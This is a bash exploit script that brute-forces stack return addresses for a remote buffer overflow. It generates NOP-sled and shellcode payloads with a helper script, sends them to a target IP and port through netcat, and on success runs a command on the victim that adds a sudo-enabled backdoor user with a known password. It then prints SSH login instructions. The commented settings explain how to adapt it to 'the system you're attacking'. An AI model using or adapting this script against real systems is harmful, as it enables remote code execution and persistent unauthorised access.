#!/bin/bash

####################
# === SETTINGS === #
####################
# you're going to need to read through and change these based on the system you're attacking. I guess you *could* just brute force the whole address space, but this script is mostly set up for if you know the range of valid stack addresses that you could be looking for.
# - ie, say the stack range is from 0x1000 to 0x5000. This means the "lowest" spot on the stack is at address 0x5000, and you should set $stack_base to 0x5000. Now, the 0x1000 is the "highest" spot on the stack, meaning the size of the stack is 0x5000 - 0x1000 = 0x4000 (there are 0x4000 bytes of stack space). You can then set $stack_add_end to 0x4000, and this will tell the script to start at 0x5000, and work its way back up to 0x1000
# - you're also going to need to tell it how fast to go through those addresses ($stack_add_increment), the size of your buffer you're trying to overflow, IP address, port, etc etc.
# - I've tried to leave good comments, but if it doesn't work, make sure you know what you're doing. This isn't like a new SUV you can just hit the gas pedal on, this is like a junky old motorcycle in the garage you might have to tighen some bolts on every few miles

# IP AND PORT - change these to meet needs
ip='10.10.10.10'
port='1337'

# buffer overflow stuff
buffer_size=$(( 200 )) # size of NOPs + shellcode
num_ret_addrs=32 # number of return addresses to write
egg_order="NSR" #"shape" of egg, which sections to put where. options are N,S,R (nop,shellcode,ret addrs)
A_fill_size=$(( 16 )) #12 # (optional) use this many "A"s in position of "A" in egg_order
allignment_max=$((1-1)) # try all allignments to this many bytes (ie if 3, try adding 0,1,2,3 to beginning) (set to 0 to disable)
allignment_segment="A" # set to "N" or "A" -- determines whether to add allignment to nop section or A fill section

# stack shit. These are all used in the below for loop, starting with "for offs in..."
# stack_base=$(( 0x7ffffffff000 )) # where to start trying
stack_base=$(( 0xc0000000 )) # where to start trying
# - IE, this is the "lowest" (highest address) in the stack something could be.

stack_add_start=0 # try adding values to base, starting with this
# - ie, we start counting from ($stack_bash - $stack_add_start) (remember lower addresses are higher), then work our way "up" the stack (to lower addresses).

stack_add_end=$(( 0x21000 )) # try adding values to base, ending with this
#                 ^^^^^^^ 0x21000 is size of stack on 32bit / i636 system (but double check for your sceneario)
# - ie this is "highest" up on the stack / lowest address we will try before giving up.
# stack_add_end=$(($stack_base - 0x7ffffffde000 )) # try adding values to base, ending with this
echo stack end is $stack_add_end

stack_add_increment=$(( 200 )) # add by this much each time
# - this can usually be based on the size of your NOP sled (but I set it to a little smaller usually just to be safe)
# stack_add_increment=$(( ($buffer_size - 50 ) / 2)) # uncomment to set inc to NOPsize/2 (assuming 50byte shellcode


# what to do once we're successful (this runs on victim machine)
shell_cmd='useradd -g sudo -p papAq5PwY/QQM mynewuser; echo RCE; exit' # run this command to check for success
# - this will add the user "mynewuser", with password "password", to the machine, as well as grant it sudo permissions, then echo the string "RCE", and exit
# - "echo RCE" so that we can look for the "RCE" output to determine success, and make user as side effect


####################
####################

# epoch in milliseconds
START_TIME=$(date +%s%3N) # needs to exist for rate limit math stuff

# log number of attemps
attempts=0

# try different offsets:
# this is the for loop where we try all the offsets, based on the above definitions of stack_base, stack_add_start, etc etc
for offs in $(seq $stack_add_start $stack_add_increment $stack_add_end) ; do
# for (( offs=$stack_add_start; offs<=$stack_add_end; offs+=$stack_add_increment )) ; do # <- this is needed if we have like a huge stack space or smtn, that way we don't need to load everything into memory at once

	# try different allignments
	# this is for if, for example, the start of our buffer is not properly alligned with a 4-byte boundary (or whatever allignment is needed).
	for allignment in $(seq 0 $allignment_max); do

		attempts=$(( $attempts+1 ))
		# set up egg #
		# ########## #

		# calculate address based on stack base and offset
		addr=$(( $stack_base - $offs ))

		# allignment math
		this_buffer_size=$buffer_size
		this_A_fill_size=$A_fill_size
		if [[ $allignment_segment == "N" ]]; then # add allignment to NOP section
			this_buffer_size=$(( $this_buffer_size + $allignment ))
		elif [[ $allignment_segment == "A" ]]; then # add allignment to "A" fill section
			this_A_fill_size=$(( $this_A_fill_size + $allignment ))
		else
			echo ERROR: allignment_segment is $allignment_segment, should be either N or A
			exit
		fi

		# This is where we call then hen.py script to create an egg, with all the parameters we calculated.
		printf "trying ret addr: 0x%X (0x%X - 0x%X), allignment: %d, attempt: %d\n" $addr $stack_base $offs $allignment $attempts
		python3 ./hen.py -q --buf $this_buffer_size --ret $num_ret_addrs --addr $addr --egg-order "$egg_order" --A-fill-size $this_A_fill_size
		printf "\n" >> egg

		# rate limit #
		# ########## #
		# 100 times / second max -> 10ms between requests
		# in practice, this section isn't *needed*, because it takes about 20ms for each loop iteration, but its still nice to have if you need to go slower for some reason
		LAST_TIME=$START_TIME
		START_TIME=$(date +%s%3N) # epoch time in ms
		if (( $START_TIME - $LAST_TIME < 10 )); then # if we still have time to wait
			sleep "$(( (10 - ($START_TIME - $LAST_TIME) ) / 1000 ))" # wait remaining time
		fi
	
		# send egg to victim machine
		if (cat egg ; sleep 0.005s; echo $shell_cmd) | nc $ip $port | grep "RCE"; then
			printf "$(date --rfc-3339=seconds) SUCCESS. final ret addr: 0x%X (0x%X - 0x%X), allignment: %d, attempt: %d\n" $addr $stack_base $offs $allignment $attempts | tee -a logfile
			echo "try logging in with:"
			echo "ssh mynewuser@$ip"
			exit
		fi
	done
done
